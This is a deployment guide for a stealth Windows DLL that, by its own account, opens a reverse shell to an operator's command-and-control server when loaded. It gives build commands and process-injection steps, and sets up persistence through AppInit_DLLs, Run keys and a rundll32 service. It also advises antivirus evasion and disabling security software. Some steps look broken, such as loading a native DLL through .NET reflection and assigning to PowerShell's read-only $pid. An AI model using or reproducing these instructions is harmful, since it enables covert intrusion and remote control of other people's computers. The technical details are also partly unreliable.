# 🥷 Ninja DLL Deployment Guide

## Overview

The DLL version provides stealthier deployment options compared to standalone executables. DLLs can be loaded into legitimate processes, making detection more difficult.

## Compilation

### Basic DLL Build
```bash
g++ -shared -o Ninja-Stealth-DLL.dll Ninja-Stealth-DLL.cpp -lws2_32 -lwinhttp -std=c++11
```

### Advanced Build with Obfuscation
```bash
# Strip symbols for smaller size
strip Ninja-Stealth-DLL.dll

# Add resource file (optional)
windres resources.rc resources.o
g++ -shared -o Ninja-Stealth-DLL.dll Ninja-Stealth-DLL.cpp resources.o -lws2_32 -lwinhttp -std=c++11
```

## Deployment Methods

### Method 1: PowerShell Loading (Recommended)

**Using the provided script:**
```powershell
# Load the DLL using reflection
.\Load-Ninja-DLL.ps1
```

**Manual PowerShell loading:**
```powershell
# Load DLL into current PowerShell session
[Reflection.Assembly]::LoadFrom("C:\path\to\Ninja-Stealth-DLL.dll")

# Call the exported function
[NinjaStealth]::StartNinjaStealth()
```

### Method 2: Process Injection

**Using the DLL loader:**
```bash
# Compile the loader
g++ -o Ninja-DLL-Loader.exe Ninja-DLL-Loader.cpp -std=c++11

# Inject into a target process
Ninja-DLL-Loader.exe Ninja-Stealth-DLL.dll
```

**Manual injection via PowerShell:**
```powershell
# Get process ID
$process = Get-Process -Name "notepad"
$pid = $process.Id

# Use the loader with specific PID
.\Ninja-DLL-Loader.exe Ninja-Stealth-DLL.dll $pid
```

### Method 3: Registry-based Loading

**AppInit_DLLs (System-wide):**
```powershell
# Add to AppInit_DLLs (requires admin rights)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\path\to\Ninja-Stealth-DLL.dll"
```

**Run key with rundll32:**
```powershell
# Add to current user run key
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "NinjaStealthDLL" -Value "rundll32.exe C:\path\to\Ninja-Stealth-DLL.dll,StartNinjaStealth"
```

### Method 4: Service-based Loading

**Create a service that loads the DLL:**
```powershell
# Create service (requires admin)
sc.exe create NinjaService binPath= "C:\Windows\System32\rundll32.exe C:\path\to\Ninja-Stealth-DLL.dll,StartNinjaStealth"

# Start the service
sc.exe start NinjaService
```

## Configuration

### Network Settings
Edit these values in `Ninja-Stealth-DLL.cpp` before compilation:
```cpp
std::string ip = "YOUR_C2_IP";      // Your command & control server IP
int port = 44895;                   // Your C2 port
```

### Export Functions
The DLL exports two functions:
- `StartNinjaStealth()` - Main entry point for manual loading
- `InitializeNinja()` - Alternative entry point

### Auto-execution on DLL Load
The DLL automatically starts the reverse shell when loaded via:
- `DLL_PROCESS_ATTACH` in DllMain
- Creates a separate thread to avoid blocking

## Advanced Techniques

### Process Hollowing
```powershell
# Advanced injection technique (requires custom loader)
# See Ninja-DLL-Loader.cpp for implementation
```

### DLL Proxying
Create a proxy DLL that loads the legitimate DLL and your ninja DLL:
```cpp
// Create forwarding exports to legitimate DLL
#pragma comment(linker, "/export:LegitimateFunction=legitimate.dll.LegitimateFunction")
```

### Thread Hijacking
Inject into existing threads for stealthier execution.

## Stealth Considerations

### Detection Evasion
- **Process Selection**: Inject into legitimate Windows processes
- **Timing**: Avoid immediate execution after injection
- **Naming**: Use legitimate-looking DLL names
- **Paths**: Place in system directories or legitimate application folders

### Anti-Analysis Features Built-in
- Debugger detection
- Sandbox evasion
- Process name randomization
- Delayed execution

## Troubleshooting

### DLL Loading Failures
1. **Dependencies**: Ensure all required DLLs are present
2. **Architecture**: Match target process architecture (x86/x64)
3. **Permissions**: Some injection methods require administrator rights
4. **Antivirus**: Add exclusions for testing environment

### Connection Issues
1. **Firewall**: Ensure C2 port is open on listener
2. **Network**: Verify target can reach C2 server
3. **Port**: Try different ports if default is blocked

### Injection Failures
1. **Process Protection**: Some processes have injection protections
2. **Architecture Mismatch**: Ensure DLL matches target process bitness
3. **Security Software**: Disable AV temporarily for testing

## Cleanup

### Remove Persistence
```powershell
# Remove registry entries
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NinjaStealthDLL" -ErrorAction SilentlyContinue

# Remove AppInit_DLLs entry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value ""

# Delete service
sc.exe delete NinjaService
```

### Process Cleanup
```powershell
# Kill injected processes (if needed)
Get-Process | Where-Object {$_.ProcessName -like "*ninja*"} | Stop-Process -Force
```

## Quick Reference

| Method | Stealth Level | Admin Required | Detection Difficulty |
|--------|---------------|----------------|---------------------|
| PowerShell Loading | Medium | No | Medium |
| Process Injection | High | Sometimes | High |
| Registry Loading | Low | Yes | Low |
| Service Loading | Medium | Yes | Medium |

**Default Port**: 44895
**Export Functions**: StartNinjaStealth(), InitializeNinja()
**Auto-Start**: Enabled via DLL_PROCESS_ATTACH